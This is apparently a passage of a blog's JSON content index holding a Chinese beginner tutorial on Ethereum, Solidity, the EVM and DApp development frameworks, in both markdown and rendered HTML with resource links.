---以太坊域名系统：[🔗](https://app.ens.domains)\n\n### 二、合约开发\n\n-   ChainIDE ---支持多链的在线合约开发工具：[🔗](https://chainide.com/zh-CN)\n-   Chainlist ---EVM 网络列表：[🔗](https://chainlist.org/)\n-   The Graph ---链上数据获取：[🔗](https://thegraph.com)\n-   Chainlink ---第三方预言机：[🔗](https://docs.chain.link)\n-   Alchemy ---第三方节点提供商：[🔗](https://dashboard.alchemyapi.io/signup/chain)\n\n### 三、社区交流\n\n-   登链社区 ---区块链开发者论坛：[🔗](https://learnblockchain.cn)\n-   巴比特 ---区块链资讯平台：[🔗](https://www.8btc.com)\n-   Ethereum ---以太坊基金会官方开发网站：[🔗](https://ethereum.org/en/developers)\n-   Stack Overflow ---程序开发交流社区：[🔗](https://stackoverflow.com)\n","source":"_posts/BlockChain/Road/03-Dapp.md","raw":"---\ntitle: 03-Dapp\ndate: 2024-08-02 00:02:16\ntags:\n  - BlockChain\n  - Road\ncategories:\n  - BlockChain\n  - Road\n---\n# 初探以太坊 Dapp 开发\n\nBY ZJUBCA\n\n本文假设读者已经对区块链有了基本的概念，如果你对诸如区块链、智能合约与 Dapp 这类词语完全陌生，那么我们建议读者先阅读协会的：[🔗ZJUBCA-Roadmap](../index.md)\n\n## 以太坊技术原理\n\n### 一、什么是以太坊（Ethereum）\n\n对以太坊的定义往往仁者见仁，但如果集大成来解释，以太坊是基于状态转换的「世界计算机」（所有人都可以访问并使用的计算机，不受空间限制）\n\n从计算机科学的角度来看，以太坊是一种确定但无界的由交易驱动的「状态机」（改变程序或系统保存的信息并保持共识的机体），它由全局可访问的离散单个状态和将变化应用于这种状态的虚拟机组成；从更实际的角度来看，以太坊是一种开源、在全球范围内呈去中心化并且能够执行「智能合约」（下文会详述，可简单理解为代码）的基础设施。\n\n在以太坊平台上，开发人员能够构建具有内置经济功能的强大的去中心化应用程序。它使用区块链来同步和存储系统的状态变化，并使用一种被称为「以太币」（Ether）的加密货币来计量和限制执行资源成本，提供了高可用性，可审计性，透明性和中立性。\n\n[🔗 以太坊白皮书](https://kauri.io/#collections/A%20Hackathon%20Survival%20Guide/ethereum-101-part-1-what-is-ethereum/)\n\n### 二、深入理解以太坊技术原理\n\n可能大家对上一节中提到的「状态机」的概念还有点模糊不清，为了让大家更清晰的深入到以太坊的技术原理中去，本节会以传统互联网为起点，循序渐进至以太坊的底层技术原理。\n\n用计算机技术来说，以太坊就是一个保存了数字交易永久记录的「公共数据库」。重要的是，这个数据库不需要任何中间方来维护双方的权益。相反，它可以作为一种「无需信任」的交易系统来运作，也就是你可以在不需要第三方的情况下进行点对点（P2P）交易。\n![](./pic/1.png)\n\n以太坊区块链本质上是一个为交易服务的状态机。在计算机科学中，一个状态机指的是这样一种东西，它可以读取一系列的输入，并基于这些输入产生一个新的状态。\n\n![](./pic/2.png)\n\n以太坊状态机的运行从一个「元状态」开始，这类似于在网络上没有发生任何交易之前的一个空白匣子。当交易执行时，这个元状态就转变为一些最终状态。在任何时候，这个最终状态都代表着以太坊区块链的现状。\n\n![](./pic/3.png)\n\n以太坊系统中运行着数百万笔交易，这些交易被分组归类为「区块」。每个区块由「区块头」（Header）和一系列「交易信息」(Transactions）组成。在这里，你可以简单地将区块头理解为一个包含决定区块链共识状态关键信息的 “数据集合”， 每个块只有通过对区块头的验证，才能与其前面的区块通过区块头串联在一起形成有向无环的链式结构。\n\n![](./pic/4.png)\n\n前文中提到，以太坊是由交易驱动的状态机。那么要想以太坊正确的从一个状态转到另一个状态，必须证明交易是有效且真实的，否则以太坊便失去了其不需要第三方维护这一核心价值。要想证明一个交易是有效的，就必须通过一个验证过程，这一过程称为「挖矿」。\n\n挖矿是指一组节点（即物理意义上的计算机）消耗它们的计算资源来创建一个有效交易的区块（这里仅以 Pow 为例）。网络中参与挖矿的节点被称为「矿工」。任何声明自己是「矿工」的节点都可以尝试创建和验证区块，全世界有许多矿工试图同时创建和验证区块。每个矿工在向区块链提交一个区块时同时，都要提供一个数学的证明，且把这个证明作为一个保证：如果这个数学证明存在，则该区块必然是有效的。\n\n一个矿工如果想要在主区块链上添加一个合法区块，就必须比其他矿工更快地对其证明。那么，通过让矿工提供数学证明来验证每个区块的过程被称为「工作量证明」。\n\n那么矿工为什么要消耗自己的计算机资源来验证并添加区块呢？答案是价值回报。任何完成这个验证工作的矿工都可以得到一定数额的价值回报。以太坊正是采用其链上数字货币「以太币」作为奖励。 每当一个矿工证明了一个区块，就会生成并得到一定数量的以太币。\n\n正如我们在上文给区块链的定义，区块链是一个具有共享状态的交易状态机。这个定义决定了，区块链的当前状态是一个单一的全局状态，每个人都必须接受。如果拥有多个链（状态）会破坏整个系统，因为人们不可能就哪个状态是正确的状态达成一致意见。如果这些链是分开的，就会出现一个人在一条链上有 10 个以太币，在另一条链上有 20 个的情况。在这种情况下，我们没有办法确定哪一个链最「有效」，无法确定一个人有多少有效的以太币。\n\n这一产生多条链的过程，被称为「分叉」（Fork）。因为分叉会破坏系统，因此我们通常会避免分叉，要求或者说迫使人们选择他们「相信」唯一有效的一条链。\n\n![](./pic/5.png)\n\n为了确定哪个路径是最有效的，并防止分叉的发生，以太坊使用了一种叫做「GHOST 协议」的机制。简单地说，GHOST 协议让我们必须选择在链上做「最多计算」的路径。确定该路径的一种方法是通过计算每条链所使用最新区块的数量，来表示当前每条链上的区块总数（不包括创世区块）。块数越多，路径越长，则说明挖矿的难度越大，因此该链就为最多计算链。因此这个方法也可以被简称为「最长链原则」。通过这个方式，最终使每一个节点对当前区块链的状态（链）的唯一性达成共识。\n\n![](./pic/6.png)\n\n到这里，我们就对以太坊区块链就有了一个宏观的认识。在这个链式架构的基础上，以太坊系统由如下所述的各主要组成部分支撑，如果你想更深入的了解这些，我们推荐你阅读以太坊黄皮书，不过请注意，他并没有那么易懂~\n\n[🔗 以太坊黄皮书](https://gitcode.net/mirrors/wanshan1024/ethereum_yellowpaper)\n\n-   帐户；\n-   状态；\n-   Gas 与费用；\n-   交易；\n-   区块；\n-   交易执行；\n-   挖矿；\n-   工作量证明。\n\n## Solidity 及 EVM\n\n### 一、Solidity——面向合约对象的编程语言\n\nSolidity 是由以太坊创始人之一的 Gavin Wood 所编写，是一门面向合约的、为实现智能合约而创建的高级编程语言。这门语言受到了 C++，Javascript 等语言的影响，属于静态类型语言，支持继承、库和复杂的用户定义类型等特性。其设计目的是为了能在以太坊虚拟机（EVM）上运行。\n\n众所周知，以太坊之所以被称为区块链 2.0 的开山鼻祖，其中重要的一点就是实现了「图灵完备」。所谓图灵完备，就是一切可计算的问题都能计算，这样的虚拟机或者编程语言就叫图灵完备的，图灵完备通常指具有无限存储能力的通用物理机器或编程语言。那么与图灵完备相反的是图灵不完备，比如比特币的脚本系统，就是图灵不完备的。要想充分发挥以太坊图灵完备的优势，就要通过编写运行在 EVM 上（也可以理解为链上）的「智能合约」。那么 Solidity，就是编写智能合约的编程语言。\n\n当然，除了 Solidity 以外，还有例如与 Python 接近的、文件名以.se 结尾 Serpent 编程语言也曾经流行过一段时间，除此之外也有开发者更喜欢使用 Vyper。但随着时间的推移和开发者们不断地学习和迭代，现在最成熟且应用最多的当数是 Solidity 了，因此这也是我们鼓励大家学习它的原因。\n\n以下是通过 Solidity 编写的“Hello Wordl!”代码，其中，^0.8.0 是编译器的版本号，HelloWorld 是合约名，greet 是状态变量。\n\n```solidity\n// SPDX-Lisence-Identifier: MIT\n// compiler version must be greater than or equal to 0.8.10 and less than 0.9.0\npragma solidity ^0.8.10;\n\ncontract HelloWorld {\n  string public greet = \"Hello World!\";\n}\n```\n\n如果你已经迫不及待的想要成为一名智能合约开发者，那么以下列出的学习工具一定有助于你：\n\n-   Remix ---智能合约在线开发工具：[🔗](https://remix.ethereum.org)\n-   Solidity 最新(0.8.0)中文文档：[🔗](https://learnblockchain.cn/docs/solidity)\n-   Cryptozombies ---玩游戏的方式学习 Solidity：[🔗](https://cryptozombies.io)\n-   Solidity by Example ---以太坊官方教程：[🔗](https://solidity-by-example.org)\n\n### 二、EVM——基于堆栈的以太坊虚拟机\n\n在了解 EVM 之前，首先清楚什么是虚拟机？传统的虚拟机指的是，通过软件模拟的，具备完整硬件系统功能，并运行在隔离环境下的完整计算机系统，比如 VMware、Java 虚拟机等。\n那么什么是以太坊虚拟机呢？\n\n以太坊虚拟机的英文全称为“Ethereum Virtual Machine”，简称为 EVM，这个 EVM 就是建立在以太坊区块链上的代码运行环境，是一个完全独立的沙盒，合约代码可对外完全隔离并在 EVM 内部运行，其主要作用是处理以太坊系统内的智能合约。上文提到的 Solidity 代码在部署到以太坊网络之前需要被编译成字节码。这个字节码所对应的底层机制，实际上就是 EVM 所解析的一系列操作码指令，然后由 EVM 根据此操作码，真正的完成代码的执行。\n\n从传统互联网的角度来说，程序员在为一个软件编写程序时，会使用到编程语言，例如 C++。但 C++ 是计算机的 CPU 无法理解的高级语言。程序员通过 C++ 编写好的程序需要通过编译器翻译成 CPU 可以理解的语言，即字节代码（机器语言），从而对 CPU 发号施令让软件可以在计算机上顺利运行。\n\n如果听到这里你觉得有些困惑，不必担心，坚持看完下面的例子，一定能“柳暗花明又一村”。\n\n假设一名 ZJUBCAer 小蓝是一个英语盲，但作为一名区块链爱好者，它需要经常查看一些英语文章来及时掌握行业信息。为了解决语言障碍，它会把文章通过翻译软件转译成中文再阅读。\n\n![](./pic/8.png)\n\n一篇用英语写成的文章被翻译为中文，变成了小蓝能看懂的语言，从而帮助小蓝能够轻松掌握区块链的行业信息。同理，一个用 C++ 编成的程序被编译为字节代码，变成 CPU 能看懂的语言，CPU 可以运行软件程序。\n可这跟以太坊的 EVM 有什么关系？答案是，EVM 之于以太坊，就像 CPU 之于计算机。\n\n![](./pic/9.png)\n\n以太坊是一台世界级计算机，但它毕竟不是实体电脑，也没有 CPU，那么智能合约要如何在以太坊上运行呢？EVM 就是以太坊的 CPU，以太坊开发者们通过编程语言 Solidity 写好的程序，被编译为 EVM 可以理解的 EVM 字节代码，EVM 就可以运行智能合约的程序。\n\n到这里，相信你一定对 EVM 有了初步的认识，如果你想更进一步，那么我们建议你通过 EVM 练兵场，通过学以致用的方式，更好的掌握 EVM 的底层逻辑。\n\nEVM 练兵场：[🔗](https://www.evm.codes/)\n\n## 智能合约开发\n\n什么是智能合约？其实通过上文的阅读，相信读者已经大概做到了心中有数，以太坊网络上运行程序就称之为智能合约，它和其他的程序一样，也是代码和数据(状态)的集合。\n\n智能合约（Smart Contract）和人工智能（Artificial Intelligence ）的智能没有关系，智能合约最早由尼克萨博在 95 年提出，它的概念很简单，就是将法律条文写成可执行代码。让法律条文的执行中立化，这个理念和区块链上的程序可以不被篡改、不被干预（只有有人触发交易，它将自动执行）的执行不谋而合，因此区块链引入了这个概念。以太坊网络上运行程序就称之为智能合约。\n\n### 一、以太坊客户端\n\n大家都知道，如果想跟一个独立系统交互，仅仅编写了可以被该系统编译识别的代码还不够，还需要与该系统建立稳定的连接才能将数据传输过去。前文提到，以太坊虚拟机 EVM 是一个封闭的沙盒系统，其内部代码的运行是不受到外部世界的干扰的。那么，开发者如果想访问到以太坊并且期望与之交互应该怎么做呢？答案是通过以太坊客户端。\n\n「以太坊客户端」是一个软件应用程序，它实现以太坊规范并通过 P2P 网络与其他以太坊客户端（节点）进行通信。如果不同的以太坊客户端符合参考规范和标准化通信协议，则可以进行相互操作。\n\n以太坊是一个开源项目，由“黄皮书”正式规范定义。除了各种以太坊改进提案之外，此正式规范还定义了以太坊客户端的标准行为。因为以太坊有明确的正式规范，所以，任何一个独立开发的软件，只要实现了该范式，那他就可以作为一个以太坊节点，与以太坊或其它以太坊客户端交互。\n目前以太坊客户端支持 8 种语言的客户端，这里推荐其中两款：\n\n-   go-ethereum（geth）[🔗](https://github.com/ethereum/go-ethereum)：Golang 实现，官方推荐，开发使用最多\n-   Parity[🔗](https://github.com/ethcore/parity/releases)：Rust 实现，最轻便客户端，在历次以太网攻击中表现卓越\n\n### 二、开发框架\n\n上文讲到，开发者如果想要跟以太坊交互，需要借助客户端来搭建节点才行。理论上虽然如此，但不禁想一下，如果每次开发都要手动搭建节点，且面向不同以太坊网络时还应重新搭建，未免给我们的开发增添了太多不必要的负担，对开发者的技术要求也更加严格，这显然是不利于以太坊乃至区块链技术的普及。\n\n互联网软件开发的历史已有数十年之久。我们受益于半个世纪以来积累的最佳实践，设计模式和智慧。相反，智能合约开发才刚刚开始。2015 推出的以太坊和 Solidity 仅有几年的时间。在智能合约刚推出的前几年，没有确定的工具堆栈来帮助开发者部署智能合约以及构建去中心化应用。\n\n但随着区块链技术的蓬勃发展以及广大开发者极客们的集思广益，诸如 Truffle、Hardhat 的 Dapp 开发框架应用的出现，极大的方便了开发者与区块链的交互，丰富了整个以太坊生态系统。\n\n#### - Truffle\n\nTruffle 是第一套基于以太坊的 Solidity 语言的成熟的开发框架。本身是基于 JavaScript。它对客户端做了深度集成，使开发、测试、部署都只需要一个命令行，可以在控制台使用命令行直接调用输出结果，方便调试。\nTruffle 是本地编译、部署智能合约的框架；而向前文中提到的 geth 客户端连接的才是真正的以太坊环境；testrpc 是 Truffle 本地使用内存模拟的以太坊环境，关闭终端后，部署到 testrpc 的智能合约不会保存下来，对于开发调试更加方便，合约可以在 testrpc 中通过测试后，再部署到 geth 上，从而减少不必要的损失。\n\n-   Truffle：[🔗](https://learnblockchain.cn/docs/truffle/quickstart.html)\n\n#### - Hardhat\n\nHardhat 是一个编译、部署、测试和调试以太坊应用的开发环境。它可以帮助开发者管理和自动化构建智能合约和 dApps 过程中固有的重复性任务，并围绕这一工作流程轻松引入更多功能。\nHardhat 内置了 Hardhat 网络，这是一个专为开发设计的本地以太坊网络。主要功能有 Solidity 调试，跟踪调用堆栈、console.log()和交易失败时的明确错误信息提示等，其在智能合约的 Debug 调试过程的交互性要优于 Truffle。\n除此之外，与 Truffle 不同的是，Hardhat 是一款基于插件的开发框架，其很多功能都来自于插件，开发者可以自由选择想使用的插件，甚至还可以将现有的 Truffle 项目迁移到 Hardhat 上。\n\n-   Hardhat：[🔗](https://learnblockchain.cn/docs/hardhat/getting-started)\n\n### 三、Dapp 开发\n\n#### 什么是 Dapp?\n\nApp 我们都知道是客户端应用，是 application 的简称。DApp 就是 D+App，D 是英文单词 decentralization 的首字母，单词翻译中文是去中心化，即 DApp 为去中心化应用。\n\n看到这里，大家思维中第一反应可能是，为什么要有 DApp，现在的 App 不是挺好吗？其实，两者并不是取代关系，而是并存关系，或者说 DApp 是对 App 的丰富和完善。因为 DApp 是依托于区块链底层技术的上层建筑，它和交易数据、交易资产有关联，和不可篡改去中心化存储也有关联，所以随着区块链技术越来越成熟普及，DApp 也更受到人们的青睐与期望，并更多地出现在各个生活场景中，如生产链防伪，捐款资金流向等等。\n\n![](./pic/10.png)\n\n那么作为一名开发者，是开发一款自己的 Dapp 需要做的具体步骤是什么？\nDapp 的一般开发流程：\n\n1. 创建自己的 Web3.0 钱包\n2. 使用 Solidity 编写智能合约代码\n3. 通过 Dapp 开发框架如 Hardhat、Truffle，通过 node.js 测试合约并部署\n4. 编写前端界面，并通过如 ether.js、web3.js 与智能合约进行交互\n5. 项目发布与测试\n\n-   node.js 介绍文档：[🔗](https://www.runoob.com/nodejs/nodejs-tutorial.html)\n-   ether.js 中文文档：[🔗](https://learnblockchain.cn/docs/ethers.js)\n-   web3.js(1.0)中文文档：[🔗](http://cw.hubwiz.com/card/c/web3.js-1.0/1/1/1/)\n\n## 常用工具及网站\n\n### 一、数据查询\n\n-   Etherscan ---以太坊区块链浏览器：[🔗](https://etherscan.io)\n-   Ethereum Signature Database ---EVM 调用记录数据库：[🔗](https://www.4byte.directory)\n-   ENS ---以太坊域名系统：[🔗](https://app.ens.domains)\n\n### 二、合约开发\n\n-   ChainIDE ---支持多链的在线合约开发工具：[🔗](https://chainide.com/zh-CN)\n-   Chainlist ---EVM 网络列表：[🔗](https://chainlist.org/)\n-   The Graph ---链上数据获取：[🔗](https://thegraph.com)\n-   Chainlink ---第三方预言机：[🔗](https://docs.chain.link)\n-   Alchemy ---第三方节点提供商：[🔗](https://dashboard.alchemyapi.io/signup/chain)\n\n### 三、社区交流\n\n-   登链社区 ---区块链开发者论坛：[🔗](https://learnblockchain.cn)\n-   巴比特 ---区块链资讯平台：[🔗](https://www.8btc.com)\n-   Ethereum ---以太坊基金会官方开发网站：[🔗](https://ethereum.org/en/developers)\n-   Stack Overflow ---程序开发交流社区：[🔗](https://stackoverflow.com)\n","slug":"BlockChain/Road/03-Dapp","published":1,"updated":"2024-08-07T12:42:21.967Z","_id":"clzbh821i00052sun4p2wc313","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"初探以太坊-Dapp-开发\"><a href=\"#初探以太坊-Dapp-开发\" class=\"headerlink\" title=\"初探以太坊 Dapp 开发\"></a>初探以太坊 Dapp 开发</h1><p>BY ZJUBCA</p>\n<p>本文假设读者已经对区块链有了基本的概念，如果你对诸如区块链、智能合约与 Dapp 这类词语完全陌生，那么我们建议读者先阅读协会的：<a href=\"../index.md\">🔗ZJUBCA-Roadmap</a></p>\n<h2 id=\"以太坊技术原理\"><a href=\"#以太坊技术原理\" class=\"headerlink\" title=\"以太坊技术原理\"></a>以太坊技术原理</h2><h3 id=\"一、什么是以太坊（Ethereum）\"><a href=\"#一、什么是以太坊（Ethereum）\" class=\"headerlink\" title=\"一、什么是以太坊（Ethereum）\"></a>一、什么是以太坊（Ethereum）</h3><p>对以太坊的定义往往仁者见仁，但如果集大成来解释，以太坊是基于状态转换的「世界计算机」（所有人都可以访问并使用的计算机，不受空间限制）</p>\n<p>从计算机科学的角度来看，以太坊是一种确定但无界的由交易驱动的「状态机」（改变程序或系统保存的信息并保持共识的机体），它由全局可访问的离散单个状态和将变化应用于这种状态的虚拟机组成；从更实际的角度来看，以太坊是一种开源、在全球范围内呈去中心化并且能够执行「智能合约」（下文会详述，可简单理解为代码）的基础设施。</p>\n<p>在以太坊平台上，开发人员能够构建具有内置经济功能的强大的去中心化应用程序。它使用区块链来同步和存储系统的状态变化，并使用一种被称为「以太币」（Ether）的加密货币来计量和限制执行资源成本，提供了高可用性，可审计性，透明性和中立性。</p>\n<p><a href=\"https://kauri.io/#collections/A%20Hackathon%20Survival%20Guide/ethereum-101-part-1-what-is-ethereum/\">🔗 以太坊白皮书</a></p>\n<h3 id=\"二、深入理解以太坊技术原理\"><a href=\"#二、深入理解以太坊技术原理\" class=\"headerlink\" title=\"二、深入理解以太坊技术原理\"></a>二、深入理解以太坊技术原理</h3><p>可能大家对上一节中提到的「状态机」的概念还有点模糊不清，为了让大家更清晰的深入到以太坊的技术原理中去，本节会以传统互联网为起点，循序渐进至以太坊的底层技术原理。</p>\n<p>用计算机技术来说，以太坊就是一个保存了数字交易永久记录的「公共数据库」。重要的是，这个数据库不需要任何中间方来维护双方的权益。相反，它可以作为一种「无需信任」的交易系统来运作，也就是你可以在不需要第三方的情况下进行点对点（P2P）交易。<br><img src=\"/./pic/1.png\"></p>\n<p>以太坊区块链本质上是一个为交易服务的状态机。在计算机科学中，一个状态机指的是这样一种东西，它可以读取一系列的输入，并基于这些输入产生一个新的状态。</p>\n<p><img src=\"/./pic/2.png\"></p>\n<p>以太坊状态机的运行从一个「元状态」开始，这类似于在网络上没有发生任何交易之前的一个空白匣子。当交易执行时，这个元状态就转变为一些最终状态。在任何时候，这个最终状态都代表着以太坊区块链的现状。</p>\n<p><img src=\"/./pic/3.png\"></p>\n<p>以太坊系统中运行着数百万笔交易，这些交易被分组归类为「区块」。每个区块由「区块头」（Header）和一系列「交易信息」(Transactions）组成。在这里，你可以简单地将区块头理解为一个包含决定区块链共识状态关键信息的 “数据集合”， 每个块只有通过对区块头的验证，才能与其前面的区块通过区块头串联在一起形成有向无环的链式结构。</p>\n<p><img src=\"/./pic/4.png\"></p>\n<p>前文中提到，以太坊是由交易驱动的状态机。那么要想以太坊正确的从一个状态转到另一个状态，必须证明交易是有效且真实的，否则以太坊便失去了其不需要第三方维护这一核心价值。要想证明一个交易是有效的，就必须通过一个验证过程，这一过程称为「挖矿」。</p>\n<p>挖矿是指一组节点（即物理意义上的计算机）消耗它们的计算资源来创建一个有效交易的区块（这里仅以 Pow 为例）。网络中参与挖矿的节点被称为「矿工」。任何声明自己是「矿工」的节点都可以尝试创建和验证区块，全世界有许多矿工试图同时创建和验证区块。每个矿工在向区块链提交一个区块时同时，都要提供一个数学的证明，且把这个证明作为一个保证：如果这个数学证明存在，则该区块必然是有效的。</p>\n<p>一个矿工如果想要在主区块链上添加一个合法区块，就必须比其他矿工更快地对其证明。那么，通过让矿工提供数学证明来验证每个区块的过程被称为「工作量证明」。</p>\n<p>那么矿工为什么要消耗自己的计算机资源来验证并添加区块呢？答案是价值回报。任何完成这个验证工作的矿工都可以得到一定数额的价值回报。以太坊正是采用其链上数字货币「以太币」作为奖励。 每当一个矿工证明了一个区块，就会生成并得到一定数量的以太币。</p>\n<p>正如我们在上文给区块链的定义，区块链是一个具有共享状态的交易状态机。这个定义决定了，区块链的当前状态是一个单一的全局状态，每个人都必须接受。如果拥有多个链（状态）会破坏整个系统，因为人们不可能就哪个状态是正确的状态达成一致意见。如果这些链是分开的，就会出现一个人在一条链上有 10 个以太币，在另一条链上有 20 个的情况。在这种情况下，我们没有办法确定哪一个链最「有效」，无法确定一个人有多少有效的以太币。</p>\n<p>这一产生多条链的过程，被称为「分叉」（Fork）。因为分叉会破坏系统，因此我们通常会避免分叉，要求或者说迫使人们选择他们「相信」唯一有效的一条链。</p>\n<p><img src=\"/./pic/5.png\"></p>\n<p>为了确定哪个路径是最有效的，并防止分叉的发生，以太坊使用了一种叫做「GHOST 协议」的机制。简单地说，GHOST 协议让我们必须选择在链上做「最多计算」的路径。确定该路径的一种方法是通过计算每条链所使用最新区块的数量，来表示当前每条链上的区块总数（不包括创世区块）。块数越多，路径越长，则说明挖矿的难度越大，因此该链就为最多计算链。因此这个方法也可以被简称为「最长链原则」。通过这个方式，最终使每一个节点对当前区块链的状态（链）的唯一性达成共识。</p>\n<p><img src=\"/./pic/6.png\"></p>\n<p>到这里，我们就对以太坊区块链就有了一个宏观的认识。在这个链式架构的基础上，以太坊系统由如下所述的各主要组成部分支撑，如果你想更深入的了解这些，我们推荐你阅读以太坊黄皮书，不过请注意，他并没有那么易懂~</p>\n<p><a href=\"https://gitcode.net/mirrors/wanshan1024/ethereum_yellowpaper\">🔗 以太坊黄皮书</a></p>\n<ul>\n<li>帐户；</li>\n<li>状态；</li>\n<li>Gas 与费用；</li>\n<li>交易；</li>\n<li>区块；</li>\n<li>交易执行；</li>\n<li>挖矿；</li>\n<li>工作量证明。</li>\n</ul>\n<h2 id=\"Solidity-及-EVM\"><a href=\"#Solidity-及-EVM\" class=\"headerlink\" title=\"Solidity 及 EVM\"></a>Solidity 及 EVM</h2><h3 id=\"一、Solidity——面向合约对象的编程语言\"><a href=\"#一、Solidity——面向合约对象的编程语言\" class=\"headerlink\" title=\"一、Solidity——面向合约对象的编程语言\"></a>一、Solidity——面向合约对象的编程语言</h3><p>Solidity 是由以太坊创始人之一的 Gavin Wood 所编写，是一门面向合约的、为实现智能合约而创建的高级编程语言。这门语言受到了 C++，Javascript 等语言的影响，属于静态类型语言，支持继承、库和复杂的用户定义类型等特性。其设计目的是为了能在以太坊虚拟机（EVM）上运行。</p>\n<p>众所周知，以太坊之所以被称为区块链 2.0 的开山鼻祖，其中重要的一点就是实现了「图灵完备」。所谓图灵完备，就是一切可计算的问题都能计算，这样的虚拟机或者编程语言就叫图灵完备的，图灵完备通常指具有无限存储能力的通用物理机器或编程语言。那么与图灵完备相反的是图灵不完备，比如比特币的脚本系统，就是图灵不完备的。要想充分发挥以太坊图灵完备的优势，就要通过编写运行在 EVM 上（也可以理解为链上）的「智能合约」。那么 Solidity，就是编写智能合约的编程语言。</p>\n<p>当然，除了 Solidity 以外，还有例如与 Python 接近的、文件名以.se 结尾 Serpent 编程语言也曾经流行过一段时间，除此之外也有开发者更喜欢使用 Vyper。但随着时间的推移和开发者们不断地学习和迭代，现在最成熟且应用最多的当数是 Solidity 了，因此这也是我们鼓励大家学习它的原因。</p>\n<p>以下是通过 Solidity 编写的“Hello Wordl!”代码，其中，^0.8.0 是编译器的版本号，HelloWorld 是合约名，greet 是状态变量。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs solidity\">// SPDX-Lisence-Identifier: MIT<br>// compiler version must be greater than or equal to 0.8.10 and less than 0.9.0<br>pragma solidity ^0.8.10;<br><br>contract HelloWorld &#123;<br>  string public greet = &quot;Hello World!&quot;;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>如果你已经迫不及待的想要成为一名智能合约开发者，那么以下列出的学习工具一定有助于你：</p>\n<ul>\n<li>Remix —智能合约在线开发工具：<a href=\"https://remix.ethereum.org/\">🔗</a></li>\n<li>Solidity 最新(0.8.0)中文文档：<a href=\"https://learnblockchain.cn/docs/solidity\">🔗</a></li>\n<li>Cryptozombies —玩游戏的方式学习 Solidity：<a href=\"https://cryptozombies.io/\">🔗</a></li>\n<li>Solidity by Example —以太坊官方教程：<a href=\"https://solidity-by-example.org/\">🔗</a></li>\n</ul>\n<h3 id=\"二、EVM——基于堆栈的以太坊虚拟机\"><a href=\"#二、EVM——基于堆栈的以太坊虚拟机\" class=\"headerlink\" title=\"二、EVM——基于堆栈的以太坊虚拟机\"></a>二、EVM——基于堆栈的以太坊虚拟机</h3><p>在了解 EVM 之前，首先清楚什么是虚拟机？传统的虚拟机指的是，通过软件模拟的，具备完整硬件系统功能，并运行在隔离环境下的完整计算机系统，比如 VMware、Java 虚拟机等。<br>那么什么是以太坊虚拟机呢？</p>\n<p>以太坊虚拟机的英文全称为“Ethereum Virtual Machine”，简称为 EVM，这个 EVM 就是建立在以太坊区块链上的代码运行环境，是一个完全独立的沙盒，合约代码可对外完全隔离并在 EVM 内部运行，其主要作用是处理以太坊系统内的智能合约。上文提到的 Solidity 代码在部署到以太坊网络之前需要被编译成字节码。这个字节码所对应的底层机制，实际上就是 EVM 所解析的一系列操作码指令，然后由 EVM 根据此操作码，真正的完成代码的执行。</p>\n<p>从传统互联网的角度来说，程序员在为一个软件编写程序时，会使用到编程语言，例如 C++。但 C++ 是计算机的 CPU 无法理解的高级语言。程序员通过 C++ 编写好的程序需要通过编译器翻译成 CPU 可以理解的语言，即字节代码（机器语言），从而对 CPU 发号施令让软件可以在计算机上顺利运行。</p>\n<p>如果听到这里你觉得有些困惑，不必担心，坚持看完下面的例子，一定能“柳暗花明又一村”。</p>\n<p>假设一名 ZJUBCAer 小蓝是一个英语盲，但作为一名区块链爱好者，它需要经常查看一些英语文章来及时掌握行业信息。为了解决语言障碍，它会把文章通过翻译软件转译成中文再阅读。</p>\n<p><img src=\"/./pic/8.png\"></p>\n<p>一篇用英语写成的文章被翻译为中文，变成了小蓝能看懂的语言，从而帮助小蓝能够轻松掌握区块链的行业信息。同理，一个用 C++ 编成的程序被编译为字节代码，变成 CPU 能看懂的语言，CPU 可以运行软件程序。<br>可这跟以太坊的 EVM 有什么关系？答案是，EVM 之于以太坊，就像 CPU 之于计算机。</p>\n<p><img src=\"/./pic/9.png\"></p>\n<p>以太坊是一台世界级计算机，但它毕竟不是实体电脑，也没有 CPU，那么智能合约要如何在以太坊上运行呢？EVM 就是以太坊的 CPU，以太坊开发者们通过编程语言 Solidity 写好的程序，被编译为 EVM 可以理解的 EVM 字节代码，EVM 就可以运行智能合约的程序。</p>\n<p>到这里，相信你一定对 EVM 有了初步的认识，如果你想更进一步，那么我们建议你通过 EVM 练兵场，通过学以致用的方式，更好的掌握 EVM 的底层逻辑。</p>\n<p>EVM 练兵场：<a href=\"https://www.evm.codes/\">🔗</a></p>\n<h2 id=\"智能合约开发\"><a href=\"#智能合约开发\" class=\"headerlink\" title=\"智能合约开发\"></a>智能合约开发</h2><p>什么是智能合约？其实通过上文的阅读，相信读者已经大概做到了心中有数，以太坊网络上运行程序就称之为智能合约，它和其他的程序一样，也是代码和数据(状态)的集合。</p>\n<p>智能合约（Smart Contract）和人工智能（Artificial Intelligence ）的智能没有关系，智能合约最早由尼克萨博在 95 年提出，它的概念很简单，就是将法律条文写成可执行代码。让法律条文的执行中立化，这个理念和区块链上的程序可以不被篡改、不被干预（只有有人触发交易，它将自动执行）的执行不谋而合，因此区块链引入了这个概念。以太坊网络上运行程序就称之为智能合约。</p>\n<h3 id=\"一、以太坊客户端\"><a href=\"#一、以太坊客户端\" class=\"headerlink\" title=\"一、以太坊客户端\"></a>一、以太坊客户端</h3><p>大家都知道，如果想跟一个独立系统交互，仅仅编写了可以被该系统编译识别的代码还不够，还需要与该系统建立稳定的连接才能将数据传输过去。前文提到，以太坊虚拟机 EVM 是一个封闭的沙盒系统，其内部代码的运行是不受到外部世界的干扰的。那么，开发者如果想访问到以太坊并且期望与之交互应该怎么做呢？答案是通过以太坊客户端。</p>\n<p>「以太坊客户端」是一个软件应用程序，它实现以太坊规范并通过 P2P 网络与其他以太坊客户端（节点）进行通信。如果不同的以太坊客户端符合参考规范和标准化通信协议，则可以进行相互操作。</p>\n<p>以太坊是一个开源项目，由“黄皮书”正式规范定义。除了各种以太坊改进提案之外，此正式规范还定义了以太坊客户端的标准行为。因为以太坊有明确的正式规范，所以，任何一个独立开发的软件，只要实现了该范式，那他就可以作为一个以太坊节点，与以太坊或其它以太坊客户端交互。<br>目前以太坊客户端支持 8 种语言的客户端，这里推荐其中两款：</p>\n<ul>\n<li>go-ethereum（geth）<a 